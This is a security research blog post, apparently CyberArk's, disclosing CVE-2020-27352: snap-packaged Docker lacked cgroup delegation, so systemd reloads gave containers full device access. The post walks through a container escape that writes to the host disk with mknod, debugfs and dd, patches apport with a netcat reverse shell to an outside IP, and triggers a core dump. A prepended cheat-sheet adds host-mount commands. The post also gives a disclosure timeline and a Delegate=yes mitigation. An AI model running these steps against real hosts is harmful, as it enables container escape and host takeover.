
##
#
https://www.cyberark.com/resources/threat-research-blog/the-strange-case-of-how-we-escaped-the-docker-default-container
#
##

```
 ### Check if You Can Write to a File-system
$ echo 1 > /proc/sysrq-trigger

### Check root UUID
$ cat /proc/cmdlineBOOT_IMAGE=/boot/vmlinuz-4.4.0-197-generic root=UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c ro console=tty1 console=ttyS0 earlyprintk=ttyS0 rootdelay=300- Check Underlying Host Filesystem
$ findfs UUID=<UUID Value>/dev/sda1- Attempt to Mount the Host's Filesystem
$ mkdir /mnt-test
$ mount /dev/sda1 /mnt-testmount: /mnt: permission denied. ---> Failed! but if not, you may have access to the underlying host OS file-system now.

### debugfs (Interactive File System Debugger)
$ debugfs /dev/sda1
```


The Strange Case of How We Escaped the Docker Default Container
Nimrod Stoler And Gilad Reti3/4/21
Share This!
FACEBOOK
TWITTER
EMAIL
LINKEDIN
Escaping the Docker Default Container

TL;DR
During an internal container-based Red Team engagement, the Docker default container spontaneously and silently changed cgroups overnight, which allowed us to escalate privileges and gain unabridged root access to the host machine. We were able to use this escalation of cgroups to run a reverse shell on the host and gain code execution.

This issue was a result of bad configurations in Canonical’s Snap and affected a multitude of products. It was assigned CVE-2020-27352[i], with CVSS 3 base score of 9.3 [ii] and critical severity [iii].

By default, snaps refresh to the latest version every four hours, so it is most likely that your system is already running the fixed version. If you want to make sure that you have refreshed your package, you can run snap refresh to force an immediate refresh.

Introduction
This is the story of a Docker container changing its characteristics, quietly, overnight, from a decent default Docker container well known for its robustness and security, to a privileged container that allowed us unabridged direct access to the underlying host, which led to code execution on the host and CVE-2020-27352.

This quiet, sudden, overnight transformation we saw of the default Docker container, reminded us of the transformation of personalities in Robert Luis Stevenson’s 1886 novella, “The Strange Case of Dr. Jekyll and Mr. Hyde,[iv]” so you’ll see some references to that in the context of this blog. We’ll include some (relevant) quotations from this seminal piece of literature along the way.

Linux Containers – Namespaces and cgroups
In order to create an efficient and effective isolation and resource management, the Linux kernel provides low-level mechanisms in the form of namespaces and cgroups for building the familiar, lightweight containers that allow us to virtualize the system’s environment. Docker is one of the frameworks that utilize cgroups and namespaces for the purpose of creating a secure, reliable and robust isolation.

Fundamentally, namespaces are mechanisms used to abstract and limit the access and visibility that a group of Linux processes has over various system entities, such as network interfaces, process trees, user IDs and filesystem mounts.

The Linux cgroups feature, on the other hand, provides a mechanism to limit, police and account the resource usage for a set of processes. It limits and monitors system resources like CPU time, system memory, disk bandwidth, network bandwidth and more.

This description makes cgroups look pretty innocuous. Right? What if someone misconfigures cgroups on a Docker container? Nothing significant, security-wise can happen. Right?

Let’s have a look at what Docker is saying about cgroups on their ‘security’ webpage[v]:

“So while they do not [emphasis added] play a role in preventing one container from accessing or affecting the data and processes of another container, they are essential to fend off some denial-of-service attacks. They are particularly important on multi-tenant platforms, like public and private PaaS, to guarantee a consistent uptime (and performance) even when some applications start to misbehave.”

This is to say, that even if our good Doctor Jekyll (the default Docker container) does happen to transform itself into the abominable Mr. Hyde (a container with misconfigured cgroups), the worst we could be facing is a denial-of-service. An issue, yes, but not as severe as a host RCE.

But, of course, it gets worse in Stevenson’s story when Mr. Hyde’s heavy cane met with poor Sir Carew:

“Mr. Hyde broke out of all bounds and clubbed him to the earth. And next moment, with ape-like fury, he was trampling his victim under foot and hailing down a storm of blows, under which the bones were audibly shattered and the body jumped upon the roadway.”[vi]

Poor Sir Carew was murdered by Mr. Hyde for no reason at all. As it pertains to our research here, we believed that our misconfigured cgroups could also be more dangerous than a mere denial-of-service.

The Strange Case of the Devices cgroup
Although cgroups are described as implementing resource accounting and limiting, the “Devices” cgroup, also called the “Device Whitelist Controller” in the kernel cgroups documentation [vii], seems to belong to a different breed. As a result, the Devices cgroup is described as a tool to:

“Implement a cgroup to track and enforce open and mknod restrictions on device files…”

The Red Hat Enterprise Linux guide sheds some light on this opaque definition [viii]:

“The devices subsystem allows or denies access to devices by tasks in a cgroup.”

And back to the kernel cgroups documentation, the thick fog begins to clear:

“Access is a composition of r(read), w(write), and m(mknod).”

It seems that this specific cgroup mechanism, the Devices cgroup, is not actually there to limit resource usage by a process, but to allow, or rather in our security perspective, disallow all sorts of access – be it create, read or write, to Linux kernel’s devices.

The Devices, controlled by this whitelisting mechanism can be any device used by the kernel. This includes innocuous devices such as /dev/null and /dev/zero, but also USB devices (for example /dev/uhid), cdroms (/dev/cdrom) and even the kernel’s hard disks (for example, the /dev/sda device).

To quickly summarize: The Devices cgroup is a strange inclusion into the cgroup subsystem because it is not a ‘resource accounting and limiting’ mechanism, but rather a kernel device whitelisting controller, which may cause a lot more damage than a system’s resource exhaustion.

Metamorphosis: From the Docker Default Container to RCE on the Host
“At the sight that met my eyes, my blood was changed into something exquisitely thin and icy. Yes, I had gone to bed Henry Jekyll, I had awakened Edward Hyde.”[ix]

Pretty much like Stevenson’s hero, going to bed as the respected Dr. Jekyll and waking up the evil Edward Hyde, we left a perfectly secure default Docker container on our systems one night, and the subsequent morning we found an unsecured privileged container, which eventually allowed us to run code on the host. How did this metamorphosis come about?

An Elixir Called Systemd
“There was something strange in my sensations, something indescribably new and, from its very novelty, incredibly sweet. I felt younger, lighter, happier in body.”[x]

Systemd is a software suite that provides an array of system components for Linux operating systems. It aims to unify service configuration across different Linux setups and is widely adopted by the majority of Linux distributions.

One of systemd’s main components is a system and service manager, which functions as an init system that is used to bootstrap the system userspace and manage user processes.

As part of its operation, systemd creates and manages various cgroups for services it monitors. Systemd’s cgroup managing philosophy is based on a couple of design ideas, including “The single-writer rule,” quoted from the systemd official website [xi]:

“The single-writer rule: this means that each cgroup only has a single writer, i.e. a single process managing it. (…) only a single process should own a specific cgroup, and when it does that ownership is exclusive, and nothing else should manipulate it at the same time. This rule ensures that various pieces of software don’t step on each other’s toes constantly.”

This rule has a profound influence on container systems.

“if your container manager creates and manages cgroups in the system’s root cgroup you violate rule #2, as the root cgroup is managed by systemd and hence off limits to everybody else.”[xii]

A container runtime running under systemd control, which manages cgroups in the system’s cgroup hierarchy, is violating this rule, which may cause interference with systemd’s cgroup management.

At this point we can begin to smell the source of the metamorphosing elixir.

Nightly (In)security Updates
As you can already guess, a misconfigured systemd service can pretend to manage its own created cgroups, when in fact, systemd supervises all from above, managing, creating and deleting cgroups under the service’s nose – without it noticing at all.

This is the core of our container transformation.

When systemd reloads a unit, it first cleans the cgroup mess it created behind, moving any process spawned in a sub-cgroup to upper ones. In particular, if systemd manages the dockerd service, it will clean all docker containers’ cgroups upon reloading, leaving container processes in upper cgroup Subsystem hierarchies.

Why would systemd reload itself all of a sudden?

Systemd reloads are far more frequent than one might think. It reloads on any of its services’ configuration file edits, upon the enabling of a service, disabling of one, an addition of a service dependency and many more. This means that even a not-so-active machine may be vulnerable to this container transformation if something causes a systemd service configuration change.

A notable example for such a “thing” is Debian’s “unattended-upgrades.”

Unattended-upgrades is one of Debian package managing systems – its main purpose is “to keep the computer current with the latest security (and other) updates automatically. [xiii]”

Unattended-upgrades is a periodic task, which runs once in a preconfigured duration. It downloads and installs security updates automatically and is enabled by default on various systems including Ubuntu desktop and server. When some services are upgraded, their systemd unit configuration changes, which causes systemd to reload the entire system as follows:

$ sudo journalctl -u apt-daily-upgrade.service
Dec 10 08:49:42 ubuntu systemd[1]: Starting Daily apt upgrade and clean activities...
Dec 10 08:55:51 ubuntu systemd[1]: apt-daily-upgrade.service: Succeeded.
Dec 10 08:55:51 ubuntu systemd[1]: Finished Daily apt upgrade and clean activities.
As seen above, the Ubuntu daily upgrade service started at 08:49:42. This process checks to see if there are any mandatory upgrades to download and apply. Below is the result of the automatic upgrade process:

$ journalctl --no-pager | grep "systemd\[1\]: Reloading\."
Dec 10 08:50:47 ubuntu systemd[1]: Reloading.
Dec 10 08:50:48 ubuntu systemd[1]: Reloading.
Dec 10 08:50:50 ubuntu systemd[1]: Reloading.
A number of systemd’s reloads happened consecutively at 8:50, due to the daily automatic upgrades.

This, quite ironically, sets the stage for this security vulnerability.

A Possible Cure
The systemd developers are aware that some services require managing their own cgroups, and have allowed the systemd manager to delegate cgroup sub-trees for those services. Delegated cgroups themselves are managed by systemd, but programs are free to create sub-cgroups inside it without systemd interfering with them, as written in the systemd website:

“systemd won’t fiddle with your sub-tree of the cgroup tree anymore. It won’t change attributes of any cgroups below it, nor will it create or remove any cgroups thereunder, nor migrate processes across the boundaries of that sub-tree as it deems useful anymore.” [xiv]

This allows container runtimes, such as Docker, to request cgroup delegation from systemd, and thus gain the privilege to manage their cgroups on their own. In fact, most of the Docker engine packages we checked in the various package managers enable this option by default, and thus are not vulnerable to this specific vulnerability.

This leads us to our last suspect – Snap.

Oh Snap
Snap is a software packaging and deployment system developed by the Canonical team for Linux-based systems. It is supported by a wide variety of Linux distributions out of the box, such as Ubuntu, Manjaro, Zorin OS and more. It is also available for many other distributions such as CentOS, Debian, Fedora, Kali Linux, Linux Mint, Pop!_OS, Raspbian, Red Hat Enterprise Linux and openSUSE. Many notable software companies ship their software in the Snap Store.

Starting with Docker 17.03, the Snap store also provides its own package of the Docker engine and client.

Snap has a built-in integration with systemd, allowing packages containing daemons to register themselves as systemd units. When such a snap package is installed, the snap daemon (snapd) generates a systemd unit file (the systemd configuration file) on behalf of the package’s daemon.

But, up until now, snapd did not support the Delegate option of the system unit files and hence there was no way for snap packages as Docker to request systemd cgroup delegation.

The cgroups Misconfiguration
Due to this missing feature in snapd, the Docker snap could not have indicated to snapd that it needs to manage containers cgroups by itself, giving systemd a complete ownership on those cgroups and exposing this misconfiguration.

Having identified the root of the problem, let’s explore some evidence.

The Docker container’s cgroups can be checked under /proc/<PID>/cgroup:

12:freezer:/docker/ba3398f7201b5ececf439dcadea00569d5213ae83f94135b89c3bcc7dadb2136
11:cpu,cpuacct:/docker/ba3398f7201b5ececf439dcadea00569d5213ae83f94135b89c3bcc7dadb2136
10:pids:/docker/ba3398f7201b5ececf439dcadea00569d5213ae83f94135b89c3bcc7dadb2136
9:blkio:/system.slice/snap.docker.dockerd.service
8:cpuset:/docker/ba3398f7201b5ececf439dcadea00569d5213ae83f94135b89c3bcc7dadb2136
7:devices:/docker/ba3398f7201b5ececf439dcadea00569d5213ae83f94135b89c3bcc7dadb2136
6:hugetlb:/docker/ba3398f7201b5ececf439dcadea00569d5213ae83f94135b89c3bcc7dadb2136
5:rdma:/
4:memory:/docker/ba3398f7201b5ececf439dcadea00569d5213ae83f94135b89c3bcc7dadb2136
3:perf_event:/docker/ba3398f7201b5ececf439dcadea00569d5213ae83f94135b89c3bcc7dadb2136
2:net_cls,net_prio:/docker/ba3398f7201b5ececf439dcadea00569d5213ae83f94135b89c3bcc7dadb2136
1:name=systemd:/docker/ba3398f7201b5ececf439dcadea00569d5213ae83f94135b89c3bcc7dadb2136
0::/system.slice/snap.docker.dockerd.service
In the above example we can clearly see that the devices cgroup is mapped to a folder under Docker and the container ID (ba339…). This is the correct mapping that we expect to see when the Docker daemon is managing the cgroups.

As we’ve seen on our systems, systemd may spontaneously take over Docker’s container cgroups, which results in something like the following:

12:freezer:/docker/ba3398f7201b5ececf439dcadea00569d5213ae83f94135b89c3bcc7dadb2136
11:cpu,cpuacct:/system.slice/snap.docker.dockerd.service
10:pids:/system.slice/snap.docker.dockerd.service
9:blkio:/system.slice/snap.docker.dockerd.service
8:cpuset:/docker/ba3398f7201b5ececf439dcadea00569d5213ae83f94135b89c3bcc7dadb2136
7:devices:/system.slice/snap.docker.dockerd.service
6:hugetlb:/docker/ba3398f7201b5ececf439dcadea00569d5213ae83f94135b89c3bcc7dadb2136
5:rdma:/
4:memory:/system.slice/snap.docker.dockerd.service
3:perf_event:/docker/ba3398f7201b5ececf439dcadea00569d5213ae83f94135b89c3bcc7dadb2136
2:net_cls,net_prio:/docker/ba3398f7201b5ececf439dcadea00569d5213ae83f94135b89c3bcc7dadb2136
1:name=systemd:/docker/ba3398f7201b5ececf439dcadea00569d5213ae83f94135b89c3bcc7dadb2136
0::/system.slice/snap.docker.dockerd.service
Here, the devices cgroup points to a whole different cgroup definition – the Dockerd cgroup. So, systemd had taken over the original devices cgroup of our default Docker container and changed it from the ultra-restrictive devices cgroup definition to the ultra-permissive Dockerd device cgroup.

We can check it by looking into the host’s sys cgroup filesystem:

root@ubuntu:/sys/fs/cgroup/devices/system.slice/snap.docker.dockerd.service# cat devices.list
a *:* rwm
The ‘a’ stands for all types of devices, ‘*:*’ means all devices available on the host and “rwm” means we are now allowed to Read from all devices, Write to all devices and Mknod (make new devices).

Launching the Attack
The misconfiguration of cgroups turns the default Docker container into something a lot more intimidating and attack-prone, both to the container environment and to the underlying host.

As R.L. Stevenson writes:

“Hyde in danger of his life was a creature new to me; shaken with inordinate anger, strung to the pitch of murder, lusting to inflict pain.”[xv]

In order to demonstrate an attack, we will assume that we have a rogue process running in the default Docker container.

The attack has four stages:

In the container, create a device corresponding to the underlying host’s hard disk.
Read the contents of the core_pattern kernel file to see if we can exploit that.
Exploit the kernel’s core dump file mechanism to generate a reverse-shell to an attack machine.
Generate a segmentation fault so that kernel would generate a core dump and take over the host.
Stage 1: Create a Device
The best way to find which device the host is using as its root device is to ask the /proc/cmdline file.

root@ba3398f7201b:/tmp# cat /proc/cmdline
BOOT_IMAGE=/boot/vmlinuz-5.9.0 root=UUID=43796265-7241-726b-204c-6162732052756c65 ro find_preseed=/preseed.cfg auto noprompt priority=critical locale=en_US quiet
Now we need to use findfs with the root UUID to find the actual Linux device:

root@ba3398f7201b:/tmp# findfs UUID=43796265-7241-726b-204c-6162732052756c65
/dev/sda5
A quick look in the devices.txt file on the Linux documentation tells us that the root hard disk is a block device at major 8, minor 5 [xvi]>.

We can also simply use mount and lsblk to find the host’s hard drive device.

Now to create the device:

root@ba3398f7201b:/tmp# mknod /dev/sda5 b 8 5
Stage 2: Exploit the Linux Core Dump File Mechanism
In most GNU/Linux systems, core dump files are generated by the kernel when some user process has crashed. For example, a core file would be generated when an application crashes due to invalid memory access (SIGSEGV). This core dump file contains an image of a process’s memory at the time of termination and is helpful to debug application crashes.

Such a fault signal can be easily generated from within the container.

The core_pattern file, located in /proc/sys/kernel/ is used to specify a core dump file pattern name.  We can use predetermined corename format specifiers to determine the exact filename the kernel should use when generating the core dump file but, if the first character of the core_pattern file is a pipe ‘|’ the kernel will treat the rest of the pattern as a command to run [xvii].

Let’s check the core_pattern file:

root@ba3398f7201b:/tmp# cat /proc/sys/kernel/core_pattern
|/usr/share/apport/apport %p %s %c %d %P %E
So, whenever a core dump is generated, the kernel would execute the apport file from /usr/share/.

We should now have access to the host’s hard disk and can check to see if we can read the apport file and then change it.

Stage 3: Access and Take Over the apport file
In this stage we use debugfs – a special file system debugging utility, which supports reading and writing directly from a hard drive device.

root@ba3398f7201b:/tmp# debugfs /dev/sda5
debugfs 1.42.12 (29-Aug-2014)
debugfs:
We can use debugfs prompt just as we would use the shell prompt. So, we change into /usr/share/apport/:

debugfs: cd /usr/share/apport
And then use stat to obtain information on the apport file:

debugfs:  stat apport
Inode: 1180547   Type: regular    Mode:  0755   Flags: 0x80000
Generation: 3835493899    Version: 0x00000000:00000001
User:     0   Group:     0   Size: 29776
File ACL: 0    Directory ACL: 0Links: 1   Blockcount: 64
Fragment:  Address: 0    Number: 0    Size: 0
 ctime: 0x5fe09286:061f76dc -- Mon Dec 21 12:18:14 2020
 atime: 0x5fe1e665:32c27c14 -- Tue Dec 22 12:28:21 2020
 mtime: 0x5fe09286:061f76dc -- Mon Dec 21 12:18:14 2020
crtime: 0x5fb63c3a:359629b8 -- Thu Nov 19 09:34:50 2020
Size of extra inode fields: 32
EXTENTS:
(0-7):5330129-5330136
We are going to use this information to read and write the apport file from the underlying host hard disk.

To do that, we will use the Linux utility dd, which allows us to read and write specific information from Linux devices.

root@ba3398f7201b:/tmp# dd if=/dev/sda5 skip=42641032  count=64  of=/tmp/apport
Now we have the entire apport file in our container’s /tmp/apport, let’s see what’s inside:

root@ba3398f7201b:/tmp# cat apport | more
#!/usr/bin/python3
# Collect information about a crash and create a report in the directory
# specified by apport.fileutils.report_dir.
# See https://wiki.ubuntu.com/Apport for details.
#
# Copyright (c) 2006 - 2016 Canonical Ltd.
# Author: Martin Pitt <martin.pitt@ubuntu.com>
#
# This program is free software; you can redistribute it and/or modify it
# under the terms of the GNU General Public License as published by the
# Free Software Foundation; either version 2 of the License, or (at your
# option) any later version.  See http://www.gnu.org/copyleft/gpl.html for
# the full text of the license.
import sys, os, os.path, subprocess, time, traceback, pwd, io
import signal, inspect, grp, fcntl, socket, atexit, array, struct
import errno, argparse
import apport, apport.fileutils
#
# functions
--More--
The file looks like a python3 script, so all we need to do is add an os.system() call to run a netcat reverse shell. Since we have no intention of changing the file’s size, we also need to make sure we delete the same number of characters from the file as the number we add into it.

Since our attack machine is listening at IP 13.57.11.205 at port 8081, we add the following line:

os.system(‘/usr/bin/busybox nc 13.57.11.205 8081 -e/bin/bash’)
and save the file.

Next, we should copy our file back to the hard drive. We use ‘dd’ again for that:

root@ba3398f7201b:/tmp# dd of=/dev/sda5 seek=42641032 count=64 if=/tmp/apport
Note that we switched the input file (if) and output file (of) and we now use ‘seek’ instead of ‘skip’ [xx].

So, now we’ve written the apport file back to the host’s filesystem and we are ready for the 4th and final stage of the attack.

Stage 4: Weaponize
In order to weaponize the setup we have created, all we need to do is generate a segmentation fault.

We can do that by compiling and executing the following short c-code [xxi]:

int main( void)
{
     char *aaa = 0;
     *aaa = 0;
     return 1;                // this line should not be reached…
}
See the attached PoC demo below.

Who Else is Affected by this Vulnerability?
After we succeeded weaponizing this vulnerability against the Docker default container, we set out to find which other container/sandbox vendors were also vulnerable. Some digging in the Snap packages website, snapcraft.io, taught us that kubernetes, microk8s and the deprecated AWS IoT Greengrass V1 were also affected by this issue, and vulnerable to this type of attack.

Although the affected version of Greengrass is no longer supported by AWS, they did backport the fix to this deprecated branch.

Conclusion and Mitigations
“Will Hyde die upon the scaffold? or will he find courage to release himself at the last moment? God knows; I am careless; this is my true hour of death, and what is to follow concerns another than myself. Here then, as I lay down the pen and proceed to seal up my confession, I bring the life of that unhappy Henry Jekyll to an end.” [xxii]

The end of Dr. Jekyll brings the end to our story of this vulnerability.

If you are managing your packages with Canonical’s Snap software package manager [xxiii], your system may be vulnerable to CVE-2020-27352, which is a serious vulnerability as far as containers are concerned and may affect millions of Linux desktops and servers around the world.

We used to say that containers are only as secure as their configuration. But from now on, this needs to change to: containers are only as secure as the configuration of their entire system, which includes the Linux init and service manager and the Linux package manager. As we’ve demonstrated, care must be taken to make sure that the configuration of the entire system (not only that of Docker’s) is capable of supporting the multiple demands of the container framework.

If your Linux system is not configured properly you may edit, as a temporary workaround, the system Docker service unit file manually, by using the following command:

contena@ubuntu: $ sudo systemctl edit snap.docker.dockerd.service
And then add the following lines:
Delegate=yes

Save the file and reload with the following command:

contena@ubuntu: $ sudo systemctl daemon-reload
Timeline
December 15, 2020 – Vulnerability identified and reported to Canonical

December 16, 2020 – Canonical opened a private Github Security Advisory and confirmed they were able to reproduce the bug

December 21, 2020 – Canonical assigned CVE-2020-27352

January 6, 2021 – Canonical moved the discussion to a private Launchpad bug, and classified it as critical

February 10, 2021 – Canonical released a fix to the Snap daemon

References
[i] https://ubuntu.com/security/CVE-2020-27352

[ii] And CVSS v3.1 vector AV:L/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H

[iii] See: https://www.first.org/cvss/v3.0/specification-document#i5

[iv] All quotations of R.L. Stevenson’s “The Strange Case of Dr. Jekyll and Mr. Hyde” are taken from Project Gutenberg’s eBook, at: https://www.gutenberg.org/files/43/43-h/43-h.htm
This eBook is for the use of anyone anywhere at no cost and with almost no restrictions whatsoever.  You may copy it, give it away or re-use it under the terms of the Project Gutenberg License included with this eBook or online at www.gutenberg.org

[v] See ‘Control groups’ section in https://docs.docker.com/engine/security/

[vi] All quotations of R.L. Stevenson’s “The Strange Case of Dr. Jekyll and Mr. Hyde” are taken from Project Gutenberg’s eBook, at: https://www.gutenberg.org/files/43/43-h/43-h.htm
This eBook is for the use of anyone anywhere at no cost and with almost no restrictions whatsoever.  You may copy it, give it away or re-use it under the terms of the Project Gutenberg License included with this eBook or online at www.gutenberg.org

[vii] https://www.kernel.org/doc/Documentation/cgroup-v1/devices.txt
https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/resource_management_guide/sec-devices

[ix] All quotations of R.L. Stevenson’s “The Strange Case of Dr. Jekyll and Mr. Hyde” are taken from Project Gutenberg’s eBook, at: https://www.gutenberg.org/files/43/43-h/43-h.htm
This eBook is for the use of anyone anywhere at no cost and with almost no restrictions whatsoever.  You may copy it, give it away or re-use it under the terms of the Project Gutenberg License included with this eBook or online at www.gutenberg.org

[x] All quotations of R.L. Stevenson’s “The Strange Case of Dr. Jekyll and Mr. Hyde” are taken from Project Gutenberg’s eBook, at: https://www.gutenberg.org/files/43/43-h/43-h.htm
This eBook is for the use of anyone anywhere at no cost and with almost no restrictions whatsoever.  You may copy it, give it away or re-use it under the terms of the Project Gutenberg License included with this eBook or online at www.gutenberg.org
https://systemd.io/CGROUP_DELEGATION/
https://systemd.io/CGROUP_DELEGATION/
https://wiki.debian.org/UnattendedUpgrades
https://systemd.io/CGROUP_DELEGATION/

[xv] All quotations of R.L. Stevenson’s “The Strange Case of Dr. Jekyll and Mr. Hyde” are taken from Project Gutenberg’s eBook, at: https://www.gutenberg.org/files/43/43-h/43-h.htm
This eBook is for the use of anyone anywhere at no cost and with almost no restrictions whatsoever.  You may copy it, give it away or re-use it under the terms of the Project Gutenberg License included with this eBook or online at www.gutenberg.org

[xvi] See https://github.com/torvalds/linux/blob/master/Documentation/admin-guide/devices.txt

[xvii] https://www.kernel.org/doc/Documentation/sysctl/kernel.txt

[xviii] This number is calculated by taking the starting block number 5,330,129 and multiplying it by 8.

[xix] This is simply the reported block count.

[xx] You should note that we are writing the apport file directly into the hard drive. This practice may not work if the apport file has already been used before and the file’s content has been copied into the filesystem’s cache. In that case, writing directly to the hard disk memory would not change the filesystem’s cached file, and there would seem to be no effect. In that case we may need to dump the filesystem’s cache by writing ‘1’ to /proc/sys/vm/drop_caches. Trying that may prove futile in the default Docker container, since the proc filesystem is read-only. In such a case, we may force the kernel to clear the filesystem file cache by allocating all available memory from within the container.

[xxi] Alex Murray from Canonical suggested an easier way to trigger the Linux core dump mechanism by using the following line: “bash –c ‘kill –SIGABRT $$’

[xxii] All quotations of R.L. Stevenson’s “The Strange Case of Dr. Jekyll and Mr. Hyde” are taken from Project Gutenberg’s eBook, at: https://www.gutenberg.org/files/43/43-h/43-h.htm
This eBook is for the use of anyone anywhere at no cost and with almost no restrictions whatsoever.  You may copy it, give it away or re-use it under the terms of the Project Gutenberg License included with this eBook or online at www.gutenberg.org

[xxiii] Snap is supported by Ubuntu, Debian, Fedora, Arch Linux, Manjaro, and CentOS/RHEL. See: https://www.tecmint.com/install-snap-in-linux/#:~:text=From%20a%20single%20build%2C%20a,not%20compromise%20the%20entire%20system.

Share This!
FACEBOOK
TWITTER
EMAIL
LINKEDIN
